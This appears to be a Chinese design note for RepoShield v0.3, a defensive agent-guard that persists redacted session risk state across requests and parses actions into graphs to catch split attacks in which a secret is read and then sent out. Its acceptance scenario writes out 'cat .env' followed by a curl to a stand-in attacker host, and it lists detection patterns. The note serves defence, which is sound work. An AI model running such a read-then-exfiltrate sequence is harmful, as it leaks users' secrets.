# PersistentSessionState 与 ActionGraph 增强

本文记录 RepoShield v0.3 本轮对跨请求历史状态和动作图解析的增强。

## 目标

- 在不改变公开决策语义的前提下保留跨请求、跨轮次的脱敏风险摘要。
- 将 `ActionIR` 映射为更保守的动作图，表达 pipe、dataflow、memoryflow、controlflow、package lifecycle 与 ExecTrace 观察。
- 支撑拆分式攻击检测：前一轮触碰 secret，后一轮进行网络外联时仍能命中 `INV-EGRESS-001`。

## PersistentSessionStateStore

`PersistentSessionStateStore` 继承原有 `SessionStateStore`，默认不影响旧调用。通过 `RepoShieldControlPlane(..., session_state_path=...)` 或 Gateway 自动接入后，会写入：

```text
.reposhield/session_state.jsonl
```

每条记录包含：

- `run_id` / `task_id`
- `action_id` / `decision_id`
- `prev_state_hash` / `state_hash` / `record_hash`
- 脱敏后的 `SessionState`
- `redaction` 元数据

持久化内容只保存策略相关摘要，例如：

- `secret_taint`
- `touched_secret_assets`
- `untrusted_source_seen`
- `package_taint`
- `ci_taint`
- `prior_external_sinks`
- `last_decisions`

不会保存 secret 原文、token 原文、完整工具输出或完整 URL query。

## Gateway Run ID

Gateway 通过 `gateway/session_identity.py` 为每次请求解析稳定身份，输出 `run_id`、`conversation_id`、`turn_id`、`client_id` 与 `task_id`。`run_id` 优先级为：

```text
metadata.reposhield_run_id
metadata.run_id
X-RepoShield-Run-Id
metadata.conversation_id / thread_id / session_id 派生
request.conversation_id / thread_id / session_id 派生
client_id 派生
fallback generated id
```

同一 `run_id` 下，新的 ControlPlane 会从 `.reposhield/session_state.jsonl` 或 audit log 恢复最新状态。

`SessionState` 现在区分两类 secret taint：

- `attempted_secret_taint`：动作尝试触碰 secret，但已被 block/quarantine 或尚未确认读取成功。
- `confirmed_secret_taint`：secret 已被允许进入上下文，或 ExecTrace 观测到文件/环境变量读取。

旧字段 `secret_taint` 仍保留，语义为 attempted 或 confirmed 的兼容并集；旧持久化记录中的 `secret_taint=true` 会迁移为 `confirmed_secret_taint=true`，避免安全降级。

## ActionGraph Parser

旧入口保持不变：

```python
from reposhield.action_graph import ensure_action_graph, build_action_graph
```

内部由 `src/reposhield/action_graphing/` 负责：

- `fallback_heuristic.py`：兼容旧启发式。
- `shell_parser.py`：识别 pipe、redirect、controlflow、dataflow。
- `shell_parser.py` 也识别 `$(...)` / backtick command substitution，并把内部命令到外层 sink 标注为 `dataflow`。
- `powershell_parser.py`：识别 `-EncodedCommand`、`Get-Content`、`Invoke-WebRequest`。
- `powershell_parser.py` 也覆盖 `Set-Content`、`Out-File`、`Start-Process` 等写入/执行形态。
- `python_snippet_parser.py`：识别 `open(...).read()`、`requests.*`、`urllib`、`subprocess curl`。
- `python_snippet_parser.py` 也覆盖 `os.environ[...]`、`os.getenv(...)`、`http.client`、`socket`。
- `package_script_parser.py`：用 `ExecTrace` 补充 package script、network attempt、env access。
- `package_script_parser.py` 也会消费 `PackageEvent.lifecycle_scripts`，在 preflight 之前把安装动作与生命周期脚本建立 `controlflow` 边。
- `tool_call_parser.py`：用历史 `secret_taint` 为后续网络动作补 `memoryflow`。

`ActionEdge` 已增加：

```python
confidence: float = 1.0
metadata: dict[str, Any] = field(default_factory=dict)
```

旧图 dict 没有这些字段时仍按默认值兼容。

## Policy Facts

新增或强化的 facts 包括：

- `graph.edge_count`
- `graph.complete`
- `graph.confidence_min`
- `graph.has_memoryflow_edge`
- `graph.has_pipe_edge`
- `graph.has_redirect_edge`
- `flow.secret_to_network_reachable`
- `flow.secret_to_package_script_reachable`
- `flow.untrusted_to_high_risk_reachable`
- `history.loaded_from_persistent`
- `history.state_hash`
- `history.restore_source`
- `history.state_age_seconds`
- `history.attempted_secret_taint`
- `history.confirmed_secret_taint`
- `history.secret_taint_level`
- `trace.enriched_graph`

Bench suite 同步新增聚合指标：

- `cross_step_attack_block_rate`
- `history_restore_rate`
- `graph_completeness_rate`
- `secret_to_sink_detection_rate`
- `parser_fallback_rate`
- `trace_enrichment_utility`

`INV-EGRESS-001` 现在可以由 `flow.secret_to_network_reachable` 直接触发，也可以由历史 `secret_taint` 与当前网络能力共同触发。

## 验收场景

注意：blocked / quarantined 的 secret read 会记录为 `attempted_secret_taint`；只有 allow / sandbox 观测确认或旧状态迁移才进入 `confirmed_secret_taint`。Confirmed secret taint 后续外联命中 `INV-EGRESS-001` 并 block；attempted secret taint 后续外联命中 `INV-EGRESS-001B`，进入 sandbox / approval / no_egress 治理约束。

最小验收场景：

```text
Request 1: cat .env
  -> decision = block
  -> session_state.secret_taint = true
  -> 写入 .reposhield/session_state.jsonl

Request 2: curl http://attacker.local/leak
  -> 恢复同一 run_id 的 secret_taint
  -> 形成 history.secret_taint + action.network_capability
  -> 命中 INV-EGRESS-001
  -> decision = block
```

已覆盖测试：

- `tests/test_persistent_session_state.py`
- `tests/test_action_graph_parsers.py`
- `tests/test_action_graph_parsers.py::test_explicit_tool_output_reference_adds_memoryflow`
- `tests/test_stage3_gateway.py::test_gateway_persists_session_state_across_requests_with_same_run_id`

## Final Completeness Pass

本轮补齐以下验收面：

- `src/reposhield/state_replay.py` 提供从 `session_state.jsonl` 或 audit log 恢复最新 `SessionState` 的轻量入口，便于重放、调试与离线审计。
- `src/reposhield/action_graphing/trace_enrichment.py` 作为 trace enrichment 的稳定兼容入口，避免调用方依赖具体 parser 文件名。
- EvidenceGraph 节点现在保留 `confidence`、`metadata`、parser、warning、`state_hash`、`restore_source` 与 trace enrichment 节点，支撑 Studio/报告中的因果证据链解释。
- Gateway bench 与通用 bench 对齐，均输出 cross-step、history restore、graph completeness、secret-to-sink、parser fallback、trace enrichment 指标。
- HTML bench report 除原始 JSON 外，也会渲染 metric cards，便于直接查看上述新增指标。

新增覆盖：

- `tests/test_state_replay.py`
- `tests/test_gateway_bench_metrics.py`
- `tests/policy_engine/test_evidence_graph.py::test_policy_eval_trace_preserves_graph_history_and_trace_metadata`
